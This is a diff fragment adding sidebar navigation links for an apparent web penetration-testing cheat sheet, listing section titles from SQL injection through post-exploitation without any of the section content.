+<a href="#insecure-cryptography" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Insecure Cryptography</a>
+<a href="#a03-sql-injection" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A03 — SQL Injection</a>
+<a href="#detection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Detection</a>
+<a href="#manual-exploitation" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Manual Exploitation</a>
+<a href="#sqlmap" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>SQLMap</a>
+<a href="#blind-sqli-manual" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Blind SQLi — Manual</a>
+<a href="#second-order-sqli" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Second-Order SQLi</a>
+<a href="#a04-nosql-other-injection" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A04 — NoSQL / Other Injection</a>
+<a href="#mongodb-nosql-injection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>MongoDB / NoSQL Injection</a>
+<a href="#xpath-injection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>XPath Injection</a>
+<a href="#ldap-injection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>LDAP Injection</a>
+<a href="#a05-security-misconfiguration" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A05 — Security Misconfiguration</a>
+<a href="#default-credentials-admin-panels" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Default Credentials & Admin Panels</a>
+<a href="#debug-info-disclosure" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Debug / Info Disclosure</a>
+<a href="#dangerous-http-methods" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Dangerous HTTP Methods</a>
+<a href="#a06-xss-cross-site-scripting" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A06 — XSS (Cross-Site Scripting)</a>
+<a href="#detection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Detection</a>
+<a href="#payload-variations-waf-bypass" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Payload Variations (WAF bypass)</a>
+<a href="#exploitation" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Exploitation</a>
+<a href="#blind-xss" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Blind XSS</a>
+<a href="#a07-ssrf-server-side-request-forgery" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A07 — SSRF (Server-Side Request Forgery)</a>
+<a href="#detection-basic-exploitation" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Detection & Basic Exploitation</a>
+<a href="#ssrf-bypass-techniques" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>SSRF Bypass Techniques</a>
+<a href="#ssrf-rce-scenarios" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>SSRF → RCE Scenarios</a>
+<a href="#a08-ssti-server-side-template-injection" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A08 — SSTI (Server-Side Template Injection)</a>
+<a href="#detection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Detection</a>
+<a href="#jinja2-python-flask-django" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Jinja2 (Python — Flask, Django)</a>
+<a href="#twig-php-symfony-laravel" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Twig (PHP — Symfony, Laravel)</a>
+<a href="#freemarker-java" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>FreeMarker (Java)</a>
+<a href="#erb-ruby-rails" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ERB (Ruby — Rails)</a>
+<a href="#smarty-php" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Smarty (PHP)</a>
+<a href="#pebble-velocity-java" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Pebble / Velocity (Java)</a>
+<a href="#a09-xxe-xml-external-entity" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A09 — XXE (XML External Entity)</a>
+<a href="#basic-xxe" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Basic XXE</a>
+<a href="#blind-xxe-oob-out-of-band" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Blind XXE (OOB — Out-of-Band)</a>
+<a href="#xxe-via-file-uploads" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>XXE via File Uploads</a>
+<a href="#xxe-in-json-xml-conversion" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>XXE in JSON → XML Conversion</a>
+<a href="#a10-file-upload-attacks" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A10 — File Upload Attacks</a>
+<a href="#extension-bypass" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Extension Bypass</a>
+<a href="#magic-bytes-mime-bypass" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Magic Bytes & MIME Bypass</a>
+<a href="#htaccess-upload" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>.htaccess Upload</a>
+<a href="#web-shells-reference" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Web Shells Reference</a>
+<a href="#a11-lfi-path-traversal-rfi" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A11 — LFI / Path Traversal / RFI</a>
+<a href="#path-traversal-payloads" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Path Traversal Payloads</a>
+<a href="#lfi-to-rce" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>LFI to RCE</a>
+<a href="#rfi-remote-file-inclusion" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>RFI (Remote File Inclusion)</a>
+<a href="#a12-command-injection" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A12 — Command Injection</a>
+<a href="#detection-payloads" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Detection Payloads</a>
+<a href="#filter-bypass" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Filter Bypass</a>
+<a href="#reverse-shell-via-command-injection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Reverse Shell via Command Injection</a>
+<a href="#a13-insecure-deserialization" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A13 — Insecure Deserialization</a>
+<a href="#php-deserialization" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>PHP Deserialization</a>
+<a href="#java-deserialization" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Java Deserialization</a>
+<a href="#python-pickle" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Python Pickle</a>
+<a href="#nodejs-deserialization" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Node.js Deserialization</a>
+<a href="#net-deserialization" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>.NET Deserialization</a>
+<a href="#a14-jwt-attacks" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A14 — JWT Attacks</a>
+<a href="#jwt-structure" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>JWT Structure</a>
+<a href="#jwt-attacks" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>JWT Attacks</a>
+<a href="#jwt-forge-with-known-secret" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>JWT Forge with Known Secret</a>
+<a href="#a15-oauth-oidc-attacks" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A15 — OAuth & OIDC Attacks</a>
+<a href="#a16-csrf" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A16 — CSRF</a>
+<a href="#detection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Detection</a>
+<a href="#csrf-poc" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>CSRF PoC</a>
+<a href="#csrf-token-bypass" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>CSRF Token Bypass</a>
+<a href="#a17-websockets-attacks" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A17 — WebSockets Attacks</a>
+<a href="#a18-graphql-attacks" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A18 — GraphQL Attacks</a>
+<a href="#a19-api-security-testing" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A19 — API Security Testing</a>
+<a href="#a20-race-conditions" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A20 — Race Conditions</a>
+<a href="#a21-http-request-smuggling" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A21 — HTTP Request Smuggling</a>
+<a href="#a22-cors-misconfigurations" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A22 — CORS Misconfigurations</a>
+<a href="#a23-prototype-pollution" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A23 — Prototype Pollution</a>
+<a href="#a24-ldap-injection" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A24 — LDAP Injection</a>
+<a href="#a25-web-cache-poisoning" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>A25 — Web Cache Poisoning</a>
+<a href="#post-exploitation-web-shell-pivot" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Post-Exploitation — Web Shell & Pivot</a>
+<a href="#web-shell-usage" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Web Shell Usage</a>
+<a href="#shell-stabilization" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Shell Stabilization</a>
+<a href="#source-code-review-after-access" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Source Code Review After Access</a>
+<a href="#tools-quick-reference" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Tools Quick Reference</a>
+<a href="#scanning-enumeration" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Scanning & Enumeration</a>
+<a href="#exploitation-tools" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Exploitation Tools</a>
+<a href="#key-wordlists" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Key Wordlists</a>
+<a href="#key-references" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Key References</a>
+
+      </div>`,
+    });
+  </script>
+</body>
+
+</html>
